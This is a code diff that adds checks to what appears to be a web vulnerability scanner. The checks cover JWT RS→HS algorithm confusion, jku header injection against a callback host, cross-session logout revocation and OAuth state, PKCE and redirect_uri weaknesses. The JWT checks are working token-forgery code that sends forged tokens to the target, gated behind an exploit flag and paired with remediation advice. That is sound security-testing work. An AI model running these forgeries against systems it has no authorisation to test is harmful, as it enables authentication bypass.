@@ -6,6 +6,7 @@ import base64
 import json
 import re
 import urllib.parse
+import time
 from typing import Any, Dict, List, Optional, Tuple
 
 from webprobe.core.crawler import parse_page
@@ -778,3 +779,306 @@ def check_session(ctx: Ctx) -> List[Finding]:
                 )
     return out
 
+
+
+# ============ NEW: JWT RS→HS algorithm confusion ============
+def check_jwt_rs_hs_confusion(ctx: Ctx) -> List[Finding]:
+    """If token is RS256 and server trusts HS256 with public key as secret."""
+    import hashlib
+    import hmac
+
+    if not getattr(ctx.args, "exploit", False):
+        return []
+
+    # Find a JWT
+    cookie_name = "token"
+    tok = None
+    for name, value in ctx.tokens[:1]:
+        cookie_name = name or "token"
+        tok = value
+        break
+    if not tok:
+        jwt_re = re.compile(r"eyJ[A-Za-z0-9_\-]{10,}\.eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}")
+        for p in ctx.pages:
+            m = jwt_re.search(p.get("html", ""))
+            if m:
+                tok = m.group(0)
+                break
+    if not tok:
+        return []
+
+    parts = tok.split(".")
+    if len(parts) != 3:
+        return []
+
+    try:
+        hdr = json.loads(base64.urlsafe_b64decode(parts[0] + "=" * (-len(parts[0]) % 4)))
+        payload = json.loads(base64.urlsafe_b64decode(parts[1] + "=" * (-len(parts[1]) % 4)))
+    except Exception:
+        return []
+
+    if hdr.get("alg") not in ("RS256", "RS384", "RS512", "PS256"):
+        return []
+
+    # Fetch public key from common JWKS endpoints
+    jwks_urls = ["/certs", "/.well-known/jwks.json", "/jwks.json",
+                 "/api/auth/jwks", "/auth/v1/.well-known/jwks.json"]
+    public_pem = None
+    for u in jwks_urls:
+        r = ctx.http.fetch(ctx.root + u, follow=True)
+        if r and r.status == 200:
+            try:
+                data = json.loads(r.text)
+                keys = data.get("keys") or [data]
+                for k in keys:
+                    if k.get("kty") == "RSA" and "n" in k and "e" in k:
+                        public_pem = _rsa_jwk_to_pem(k)
+                        break
+                if public_pem:
+                    break
+            except Exception:
+                pass
+
+    if not public_pem:
+        return []
+
+    # Forge token: alg=HS256, sign with the raw public PEM bytes
+    hdr_hs = dict(hdr)
+    hdr_hs["alg"] = "HS256"
+    header_b64 = base64.urlsafe_b64encode(
+        json.dumps(hdr_hs, separators=(",", ":")).encode()).rstrip(b"=").decode()
+    payload_b64 = base64.urlsafe_b64encode(
+        json.dumps(payload, separators=(",", ":")).encode()).rstrip(b"=").decode()
+    signing_input = f"{header_b64}.{payload_b64}"
+    sig = hmac.new(public_pem.encode(), signing_input.encode(), hashlib.sha256).digest()
+    forged = signing_input + "." + base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
+
+    # Submit and compare against anon
+    # cookie_name initialized above
+    anon = ctx.http.clone(cookie="").fetch(ctx.base_url, follow=True)
+    test = ctx.http.clone(cookie=f"{cookie_name}={forged}").fetch(ctx.base_url, follow=True)
+    if anon is None or test is None:
+        return []
+
+    from difflib import SequenceMatcher
+    similarity = SequenceMatcher(None, anon.text[:3000], test.text[:3000]).ratio()
+    if similarity < 0.85:
+        return [Finding(
+            "jwt", "critical",
+            "JWT RS→HS algorithm confusion (public key used as HMAC secret)",
+            ctx.base_url,
+            evidence=f"Fetched JWKS public key, forged HS256 token signed with "
+                     f"public PEM bytes, server accepted it (response differs "
+                     f"from anon: similarity={similarity:.2f})",
+            remediation="Pin accepted algorithms explicitly in the JWT library. "
+                        "Never pass the public key bytes to HMAC verification.",
+            phase=2,
+        )]
+    return []
+
+
+def _rsa_jwk_to_pem(jwk: Dict) -> str:
+    """Encode RSA modulus + exponent as SubjectPublicKeyInfo PEM."""
+    import base64 as _b
+    n = _b.urlsafe_b64decode(jwk["n"] + "=" * (-len(jwk["n"]) % 4))
+    e = _b.urlsafe_b64decode(jwk["e"] + "=" * (-len(jwk["e"]) % 4))
+    # Minimal DER: SEQUENCE { SEQUENCE { OID rsaEncryption, NULL }, BIT STRING { RSAPublicKey } }
+    def der_len(n: int) -> bytes:
+        if n < 128:
+            return bytes([n])
+        b = n.to_bytes((n.bit_length() + 7) // 8, "big")
+        return bytes([0x80 | len(b)]) + b
+    def der_int(b: bytes) -> bytes:
+        if b[0] & 0x80:
+            b = b"\x00" + b
+        return b"\x02" + der_len(len(b)) + b
+    def der_seq(content: bytes) -> bytes:
+        return b"\x30" + der_len(len(content)) + content
+    def der_bitstr(b: bytes) -> bytes:
+        return b"\x03" + der_len(len(b) + 1) + b"\x00" + b
+
+    rsa_pk = der_seq(der_int(n) + der_int(e))
+    oid = b"\x06\x09\x2a\x86\x48\x86\xf7\x0d\x01\x01\x01"
+    alg = der_seq(oid + b"\x05\x00")
+    spki = der_seq(alg + der_bitstr(rsa_pk))
+    b64 = _b.b64encode(spki).decode()
+    lines = [b64[i:i+64] for i in range(0, len(b64), 64)]
+    return "-----BEGIN PUBLIC KEY-----\n" + "\n".join(lines) + "\n-----END PUBLIC KEY-----\n"
+
+
+# ============ NEW: JWT jku / x5u injection ============
+def check_jwt_jku(ctx: Ctx) -> List[Finding]:
+    """If server trusts attacker-controlled jku/x5u keyset URL."""
+    if not getattr(ctx.args, "exploit", False):
+        return []
+    if not ctx.collab:
+        return [Finding(
+            "jwt", "info", "jku/x5u test needs --collab-host for callback",
+            ctx.base_url, confidence="high", phase=2,
+        )]
+
+    cookie_name = "token"
+    tok = None
+    for name, value in ctx.tokens[:1]:
+        cookie_name = name or "token"
+        tok = value
+        break
+    if not tok:
+        jwt_re = re.compile(r"eyJ[A-Za-z0-9_\-]{10,}\.eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}")
+        for p in ctx.pages:
+            m = jwt_re.search(p.get("html", ""))
+            if m:
+                tok = m.group(0)
+                break
+    if not tok:
+        return []
+
+    parts = tok.split(".")
+    if len(parts) != 3:
+        return []
+
+    try:
+        hdr = json.loads(base64.urlsafe_b64decode(parts[0] + "=" * (-len(parts[0]) % 4)))
+        payload = json.loads(base64.urlsafe_b64decode(parts[1] + "=" * (-len(parts[1]) % 4)))
+    except Exception:
+        return []
+
+    marker = "jku_" + rand_token("", 10)
+    jku_url = f"http://{ctx.collab.host}:{ctx.collab.port}/{marker}"
+
+    # Forge token with jku pointing at our collaborator
+    hdr_new = dict(hdr)
+    hdr_new["jku"] = jku_url
+    header_b64 = base64.urlsafe_b64encode(
+        json.dumps(hdr_new, separators=(",", ":")).encode()).rstrip(b"=").decode()
+    payload_b64 = base64.urlsafe_b64encode(
+        json.dumps(payload, separators=(",", ":")).encode()).rstrip(b"=").decode()
+    forged = f"{header_b64}.{payload_b64}.deadbeef"
+
+    before = ctx.collab.count(marker)
+    client = ctx.http.clone(cookie=f"{cookie_name}={forged}")
+    client.fetch(ctx.base_url, follow=True)
+    time.sleep(1.0)
+    if ctx.collab.count(marker) > before:
+        return [Finding(
+            "jwt", "critical",
+            "JWT jku header trusted (attacker controls key source)",
+            ctx.base_url,
+            evidence=f"Server fetched attacker-controlled JWKS at {jku_url}",
+            remediation="Reject tokens whose jku/x5u is not on a strict allowlist.",
+            phase=2,
+            )]
+    return []
+
+
+# ============ NEW: concurrent session revocation ============
+def check_session_revocation(ctx: Ctx) -> List[Finding]:
+    """Logout from session A, assert session B is invalidated server-side."""
+    email = getattr(ctx.args, "test_email", "")
+    password = getattr(ctx.args, "test_password", "")
+    if not (email and password):
+        return []
+
+    page_url, f = find_login_form(ctx)
+    if not f or not page_url:
+        return []
+
+    def login():
+        c = ctx.http.clone(cookie="")
+        if not auto_login_into(c, ctx, email, password):
+            return None
+        return c
+
+    c_a = login()
+    c_b = login()
+    if not (c_a and c_b):
+        return []
+
+    # Fire logout on A
+    logout_url = None
+    for page in ctx.pages:
+        r = c_a.fetch(page["url"], follow=True)
+        if r is None:
+            continue
+        _, forms, _ = parse_page(r.text, r.url)
+        for form in forms:
+            if re.search(r"(?i)(logout|signout|sign-out)", form["action"]):
+                logout_url = form["action"]
+                break
+        if logout_url:
+            break
+        links, forms, _ = parse_page(r.text, r.url)
+        for link in links:
+            if re.search(r"(?i)(logout|signout|sign-out)", link):
+                logout_url = link
+                break
+
+    if not logout_url:
+        return []
+
+    c_a.fetch(logout_url, "POST", "", follow=True)
+
+    # Now check if B still works
+    probe_b = c_b.fetch(ctx.base_url, follow=True)
+    anon = ctx.http.clone(cookie="").fetch(ctx.base_url, follow=True)
+    if probe_b is None or anon is None:
+        return []
+
+    from difflib import SequenceMatcher
+    similarity = SequenceMatcher(None, anon.text[:3000], probe_b.text[:3000]).ratio()
+    if similarity < 0.85:
+        return [Finding(
+            "session_revoke", "high",
+            "Session B remains valid after Session A logout (no cross-session revoke)",
+            logout_url,
+            evidence="Logged out on Session A, but Session B still receives "
+                     "authenticated content. Logout is per-session, not account-wide.",
+            remediation="Implement server-side session store keyed by user ID; "
+                        "logout should terminate all sessions for that user.",
+            phase=2,
+        )]
+    return []
+
+
+# ============ NEW: OAuth / OIDC flow audit ============
+def check_oauth_audit(ctx: Ctx) -> List[Finding]:
+    """Inspect OAuth authorize URL for state, PKCE, and redirect_uri issues."""
+    if not getattr(ctx.args, "oauth_test", False):
+        return []
+
+    auth_flows = []
+    for u in ctx.discovered + ctx.endpoints:
+        if re.search(r"(?i)/(oauth|authorize|auth/callback|auth/login)", u):
+            auth_flows.append(u)
+
+    if not auth_flows:
+        return []
+
+    out: List[Finding] = []
+    for flow in auth_flows[:5]:
+        full = flow if flow.startswith("http") else urllib.parse.urljoin(ctx.base_url, flow)
+        sp = urllib.parse.urlsplit(full)
+        qs = urllib.parse.parse_qs(sp.query)
+        problems = []
+        if "response_type" in qs and "state" not in qs:
+            problems.append("no `state` parameter (OAuth CSRF)")
+        if "code_challenge" not in qs and "response_type" in qs and qs["response_type"] == ["code"]:
+            problems.append("no PKCE code_challenge")
+        if "redirect_uri" in qs:
+            redirect = qs["redirect_uri"][0]
+            rsp = urllib.parse.urlsplit(redirect)
+            if rsp.netloc and rsp.netloc != urllib.parse.urlsplit(ctx.base_url).netloc:
+                problems.append(f"redirect_uri to external host: {rsp.netloc}")
+
+        if problems:
+            out.append(Finding(
+                "oauth", "high",
+                "OAuth authorization flow weakness",
+                full,
+                evidence="; ".join(problems),
+                remediation="Enforce state parameter (CSRF); require PKCE for "
+                            "public clients; validate redirect_uri against strict "
+                            "allowlist (exact match, no wildcards).",
+                phase=2,
+            ))
+    return out
